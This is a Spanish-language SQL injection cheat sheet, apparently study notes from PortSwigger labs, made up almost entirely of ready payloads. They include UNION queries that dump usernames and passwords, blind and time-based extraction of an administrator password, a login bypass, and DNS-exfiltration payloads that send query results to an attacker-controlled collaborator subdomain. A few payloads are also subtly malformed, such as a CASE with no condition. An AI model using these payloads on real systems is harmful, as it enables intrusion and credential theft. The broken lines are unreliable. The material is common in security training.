# SQL injection cheatsheet

## Table of contents

- [SQL injection cheatsheet](#sql-injection-cheatsheet)
  - [UNION ATTACK](#union-attack)
  - [BLIND SQLi](#blind-sqli)
  - [TIME BASED](#time-based)
  - [LOGIN BYPASS](#login-bypass)
  - [CHEATSHEET PORTSWIGGER](#cheatsheet-portswigger)
    - [CONCATENACION](#concatenacion)
    - [SUBSTRING](#substring)
    - [COMENTARIOS](#comentarios)
    - [DATABASE VERSION](#database-version)
    - [DATABASE CONTENT](#database-content)
    - [CONDITIONAL ERROR](#conditional-error)
    - [MULTIPLES QUERYS](#multiples-querys)
    - [TIME DELAYS](#time-delays)
    - [CONDICIONAL TIME DELAYS](#condicional-time-delays)
    - [DNS LOOKUP](#dns-lookup)
    - [DNS LOOKUP CON EXFILTRACION DE DATOS](#dns-lookup-con-exfiltracion-de-datos)

## INTRO

En base a todos los laboratorios de SQL injection se crea esta hoja de trucos:

- Prueba de todo y para todas las DBMS a la hora de testear un SQLi.
- URL encodea caracteres especiales.
- Oracle siempre pide una tabla para sus consultas, por suerte tiene una tabla por defecto llamada **dual**.

## UNION ATTACK

```sql

#determinar cantidad de columnas
category='+UNION+SELECT+NULL--
category='+UNION+SELECT+NULL,NULL--
category='+UNION+SELECT+NULL,NULL,NULL--
category='+UNION+SELECT+'a','a'+FROM+dual-- #oracle
...

#determinar si alguna columna admite cadenas
category='+UNION+SELECT+'a',NULL,NULL--
category='+UNION+SELECT+NULL,'a',NULL--
category='+UNION+SELECT+NULL,NULL,'a'--
...

#obtener el nombre de las tablas (varia segun DBMS)
category='+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- -

#obtener el nombre de las columnas (varia segun DBMS)
category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+where+table_name='sers_qwxkvs'- -

#obtener informacion
category='+UNION+SELECT+username,password+from+users--
category='+UNION+SELECT+NULL,concat(username,':',password)+from+users--
category='+UNION+SELECT+NULL,username||'~'||password+from+users--

```

## BLIND SQLi

No tenemos respuesta de la consulta en la respuesta del servidor, pro si puede mostrar o no un mensaje o un error y dar indicio de que si el mensaje o error aparece es que pasa algo y sino es que no pasa.

```sql

#condicional response
' and '1'='1
' and '1'='2

#verificar que una tabla existe (users)
' AND (SELECT 'a' FROM users LIMIT 1)='a

#verificacion si un registro especifico existe
' AND (SELECT 'a' FROM users WHERE username='administrator')='a

#determinar la longitud de una contraseña de usuario (jugar con el intruder y snipper attack)
' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)=1)='a

#determinar la contraseña de un usuario (jugar con intruder y cluster bomb)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
SUBSTRING(string, start, length)

#uso de condicionales para sql blind (en este ejemplo oracle)
category='||(select CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END from dual)||'
category='||(select CASE WHEN (1=2) THEN to_char(1/0) ELSE '' END from dual)||'
category='||(select CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END from users where username='administrator')||
category='||(select CASE WHEN (length(password)=§1§) THEN to_char(1/0) ELSE '' END from users where username='administrator')||'
category='||(select CASE THEN to_char(1/0) ELSE '' END from users where username='administrator')||'
```

## TIME BASED

```sql

#POC
category='+select sleep(10)--

#aprovechar time delay mediante condcionales
category='%3bSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- - # %3b es ;
category='%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--

category='%3bSELECT+CASE+WHEN+(length(password)=§1§)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--
category='%3bSELECT+CASE+WHEN+(length(SUBSTRING(password,§1§,1)='§c§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END from users where username='administrator'--
```

## LOGIN BYPASS

```sql
'+or+1=1--
```

## CHEATSHEET PORTSWIGGER

### CONCATENACION

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`'foo'\|\|'bar'`|
|Microsoft|`'foo'+'bar'`|
|PostgreSQL|`'foo'\|\|'bar'`|
|MySQL|`'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')`|

### SUBSTRING

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

### COMENTARIOS

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`--comment`|
|Microsoft|`--comment o /*comment*/`|
|PostgreSQL|`--comment o /*comment*/`|
|MySQL|`#comment`  `-- comment` [Note the space after the double dash]  `/*comment*/`|

### DATABASE VERSION

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SELECT banner FROM v$version  SELECT version FROM v$instance`|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

### DATABASE CONTENT

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SELECT * FROM all_tables  SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
|Microsoft|`SELECT * FROM information_schema.tables  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' `|
|PostgreSQL|`SELECT * FROM information_schema.tables  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`|
|MySQL|`SELECT * FROM information_schema.tables  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`|

### CONDITIONAL ERROR

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|

### MULTIPLES QUERYS

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`Does not support batched queries.`|
|Microsoft|`QUERY-1-HERE; QUERY-2-HERE`|
|PostgreSQL|`QUERY-1-HERE; QUERY-2-HERE`|
|MySQL|`QUERY-1-HERE; QUERY-2-HERE`|

### TIME DELAYS

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT sleep(10)`|

### CONDICIONAL TIME DELAYS

|DBMS|PAYLOAD|
|:-----:|:----:|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`|

### DNS LOOKUP

|DBMS|PAYLOAD|
|:-----:|:-----:|
|Oracle|La siguiente técnica aprovecha una vulnerabilidad de entidad externa XML ( [XXE](https://portswigger.net/web-security/xxe) ) para activar una búsqueda de DNS. Se ha parcheado la vulnerabilidad, pero existen muchas instalaciones de Oracle sin parche: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  La siguiente técnica funciona en instalaciones de Oracle con parches completos, pero requiere privilegios elevados: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`|
|Microsoft|`exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'`|
|PostgreSQ|`copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'`|
|MySQL|Las siguientes técnicas funcionan solo en Windows: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`|

### DNS LOOKUP CON EXFILTRACION DE DATOS

|DBMS|PAYLOAD|
|:----:|:----:|
|Oracle|`SELECT extractvalue(xmltype('\<\?xml version="1.0" encoding="UTF-8"\?><!DOCTYPE root [ <!ENTITY \% remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"\> \%remote;\]\>'),'/l') FROM dual`|
|Microsoft|`declare\ @p varchar(1024);set \@p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+\@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')`|
|PostgreSQL|`create OR replace function f() returns void as \$\$ <br /> declare c text;  <br /> declare p text;  <br />begin  <br />SELECT into p (SELECT YOUR-QUERY-HERE);  <br />c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';  <br />execute c;  <br />END;  <br />$$ language plpgsql security definer;  <br />SELECT f();`|
|MySQL|The following technique works on Windows only:  <br /> `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'`|

**Fuente [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**